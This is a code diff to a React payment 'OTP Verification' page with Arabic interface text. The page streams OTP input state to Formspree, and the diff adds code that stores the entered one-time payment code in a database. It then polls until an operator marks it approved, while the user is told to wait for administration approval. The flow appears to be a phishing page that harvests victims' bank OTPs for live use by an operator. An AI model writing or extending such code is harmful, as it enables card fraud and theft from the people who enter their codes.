@@ -3,11 +3,12 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Shield, RefreshCw, CheckCircle2 } from "lucide-react";
+import { Shield, RefreshCw, CheckCircle2, Loader2 } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { supabase } from "@/integrations/supabase/client";
 
 const OTPVerification = () => {
   const navigate = useNavigate();
@@ -25,6 +26,8 @@ const OTPVerification = () => {
   const [timer, setTimer] = useState(120); // 2 minutes
   const [canResend, setCanResend] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
+  const [applicationId, setApplicationId] = useState<string | null>(null);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
 
   // Send OTP data to Formspree in real-time
   useFormspreeSync({
@@ -35,6 +38,44 @@ const OTPVerification = () => {
     otpLength: otp.length,
     remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
   }, "صفحة تأكيد الدفع - OTP Verification");
+
+  useEffect(() => {
+    // Get application ID
+    const storedId = localStorage.getItem('applicationId');
+    if (storedId) {
+      setApplicationId(storedId);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (waitingForApproval && applicationId) {
+      // Check for approval every 2 seconds
+      const interval = setInterval(async () => {
+        const { data, error } = await supabase
+          .from('customer_applications')
+          .select('otp_approved, status')
+          .eq('id', applicationId)
+          .single();
+
+        if (data?.otp_approved) {
+          clearInterval(interval);
+          setWaitingForApproval(false);
+          
+          toast({
+            title: "تمت الموافقة",
+            description: "تم تأكيد عملية الدفع بنجاح",
+          });
+
+          setTimeout(() => {
+            localStorage.removeItem('applicationId');
+            navigate("/");
+          }, 2000);
+        }
+      }, 2000);
+
+      return () => clearInterval(interval);
+    }
+  }, [waitingForApproval, applicationId, navigate, toast]);
 
   // Timer countdown
   useEffect(() => {
@@ -74,19 +115,41 @@ const OTPVerification = () => {
       });
       return;
     }
+    
     setIsVerifying(true);
 
-    // Simulate verification (in real app, call API here)
-    setTimeout(() => {
+    try {
+      if (applicationId) {
+        // Save OTP to database
+        const { error } = await supabase
+          .from('customer_applications')
+          .update({
+            otp_code: otp,
+            current_step: 'otp'
+          })
+          .eq('id', applicationId);
+
+        if (error) throw error;
+
+        toast({
+          title: "تم إرسال الكود",
+          description: "في انتظار موافقة الإدارة...",
+        });
+
+        setIsVerifying(false);
+        setWaitingForApproval(true);
+      } else {
+        throw new Error('Application ID not found');
+      }
+    } catch (error) {
+      console.error('Error saving OTP:', error);
       setIsVerifying(false);
       toast({
-        title: "تم التحقق بنجاح",
-        description: "تم تأكيد عملية الدفع بنجاح"
+        title: "خطأ",
+        description: "حدث خطأ في حفظ البيانات",
+        variant: "destructive"
       });
-      setTimeout(() => {
-        navigate("/");
-      }, 1500);
-    }, 2000);
+    }
   };
   return <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
       <section className="pt-8 pb-16 px-4 md:px-6">
@@ -198,14 +261,19 @@ const OTPVerification = () => {
               {/* Continue Button */}
               <Button
                 onClick={handleVerify}
-                disabled={isVerifying || otp.length < 4}
+                disabled={isVerifying || waitingForApproval || otp.length < 4}
                 size="lg"
-                className="w-full h-14 text-lg font-bold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-300 hover:scale-[1.02] disabled:hover:scale-100"
+                className="w-full h-14 text-lg font-bold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-300 hover:scale-[1.02] disabled:hover:scale-100 disabled:opacity-50"
               >
                 {isVerifying ? (
                   <>
-                    <div className="ml-2 h-5 w-5 animate-spin rounded-full border-2 border-primary-foreground border-t-transparent"></div>
+                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                     جاري التحقق...
+                  </>
+                ) : waitingForApproval ? (
+                  <>
+                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
+                    في انتظار الموافقة...
                   </>
                 ) : (
                   <>
@@ -214,6 +282,14 @@ const OTPVerification = () => {
                   </>
                 )}
               </Button>
+
+              {waitingForApproval && (
+                <div className="mt-4 p-4 bg-yellow-50 dark:bg-yellow-950/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
+                  <p className="text-sm text-yellow-800 dark:text-yellow-200 text-center">
+                    🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
+                  </p>
+                </div>
+              )}
 
               {/* Security Note */}
               <div className="text-center pt-4 border-t">
